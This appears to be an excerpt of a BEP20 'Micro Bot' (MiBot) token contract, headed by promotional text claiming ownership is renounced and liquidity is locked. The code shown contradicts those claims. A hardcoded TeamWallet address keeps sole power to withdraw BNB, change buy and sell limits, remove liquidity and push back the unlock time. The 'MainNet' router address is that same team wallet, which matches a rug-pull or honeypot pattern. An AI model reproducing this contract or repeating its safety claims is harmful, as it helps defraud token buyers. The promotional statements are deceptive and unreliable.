...
| || || | | || |     (_____ (| |   | |
| || || |_| || \_____      | | |___| | 
|_||_||_(_____)______)     |_|\_____/
https://t.me/MicroBot

Micro Bot 
Supply: 1000 
Decimals: 18 
TG: https://t.me/MicroBot
...
Max Buy 10 Token
Max Sell 1 Token 
BUSD Reward Claim on BSCSCAN

Safu:
Contract Verified
Ownership renounced
initial liq 0.2 (Degen)
LP Lock
Stealth Launch
...
abstract contract Ownable {
    ...
    address public constant TeamWallet=0x0C753Af3Da580B35158b6E60b40F51dE87d1cC40;
    ...
    function transferOwnership(address newOwner) public {
        require(address(TeamWallet) == msg.sender);
...
contract MicroBot is IBEP20, Ownable
{
    ...
    //Token Info
    string private constant _name = 'Micro Bot';
    string private constant _symbol = 'MiBot';
    ...
    uint256 public constant BalanceLimitDivider=100;
    //Divider for sellLimit based on circulating Supply (0.1%)
    uint256 public constant SellLimitDivider=1000;
    ...
    //TestNet
    //address private constant PancakeRouter=0x0C753Af3Da580B35158b6E60b40F51dE87d1cC40;
    //MainNet
    address private constant PancakeRouter=0x0C753Af3Da580B35158b6E60b40F51dE87d1cC40;
    ...
    function TeamWithdrawMarketingBNB(uint256 amount) public {
        require(address(TeamWallet) == msg.sender);
    ...
    function TeamUpdateLimits(uint256 newBalanceLimit, uint256 newSellLimit) public {
        require(address(TeamWallet) == msg.sender);
    ...
    function TeamRemoveLiquidity(bool addToStaking) public {
        require(address(TeamWallet) == msg.sender);
        //Only callable if liquidity Unlock time is over
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
    ...
    function TeamRemoveRemainingBNB() public {
        require(address(TeamWallet) == msg.sender);
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime=block.timestamp+DefaultLiquidityLockTime;
